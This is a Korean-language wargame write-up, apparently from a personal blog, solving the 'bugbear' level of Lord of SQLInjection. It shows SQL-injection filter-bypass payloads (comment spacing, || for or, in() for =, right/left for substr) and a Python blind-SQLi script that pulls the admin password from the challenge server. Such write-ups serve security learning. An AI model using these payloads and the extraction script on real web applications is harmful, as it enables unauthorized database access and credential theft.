---
layout: single
title: "[Lord of SQLInjection] bugbear write-up"
date: 2025-04-25 20:14 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## Lord of SQLInjection (bugbear)

### ✏️ 풀이

필터링 되는 부분을 해석해보면 pw 파라미터는 싱글쿼터(')만 필터링하고 no 파라미터에서 필터링하는 문자는 아래와 같다.

```
' 
substr
ascii
=
or
and
space
like
0x
```

![image-20250425201527429](/images/2025-04-25-los-bugbear/image-20250425201527429.png)

<br>

먼저 공백을 /**/ 주석을 이용해 우회하고, and or 연산자 우선 순위를 이용하는데 or 연산자를 || 문자를 이용해서 우회할 수 있다. 또한 =과 like를 방어하고 있는데 in 문자와 더블쿼터를 사용해서 아래처럼 만들어주면 `Hello admin` 이 출력되는 것을 볼 수 있다.

```
1/**/||/**/id/**/in/**/("admin")
```

![image-20250425203036937](/images/2025-04-25-los-bugbear/image-20250425203036937.png)

<br>

페이로드는 아래와 같고 substr를 right와 left함수를 사용하여 우회하였고 =와 like는 in함수를 사용해서 admin pw 값의 첫 글자가 a인지 확인하는 페이로드이다. 이제 blind sqli 코드를 짜보자.

```
1/**/||/**/id/**/in/**/("admin")/**/%26%26right(left(pw,1,1))/**/in/**/("a")--/**/-
```

![image-20250425205124067](/images/2025-04-25-los-bugbear/image-20250425205124067.png)

<br>

최종 작성된 익스플로잇 코드는 아래와 같다. char

```python
import requests

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
pw = ""

cookie = {"PHPSESSID": "l4fo5d8u56opaucpiffcbfvver"}

for i in range(1, 100):
    found = False
    for j in range(32, 127):
        param = {
            "no": f'1/**/||/**/id/**/in/**/("admin")/**/&&/**/right(left(pw,{i}),1)/**/in/**/(char({(j)}))#',
        }
        r = requests.get(url=url, cookies=cookie, params=param)
        if "Hello admin" in r.text:
            found = True
            print(f"[+]found! 패스워드 {i}번 째 문자는 {chr(j)}입니다.")
            pw += chr(j)
            break
    if not found:
        print("end")
        print(pw)
        break

```

이런식으로 나오는데 `52DC3991` 이 char 함수로 뽑은 거여서 DC가 소문자일 때랑 대문자일 때 전부 맞다고 판단하는 것 같다. 소문자로 바꿔서 넣으면 solve!

![image-20250425220504343](/images/2025-04-25-los-bugbear/image-20250425220504343.png)

![image-20250425221021675](/images/2025-04-25-los-bugbear/image-20250425221021675.png)

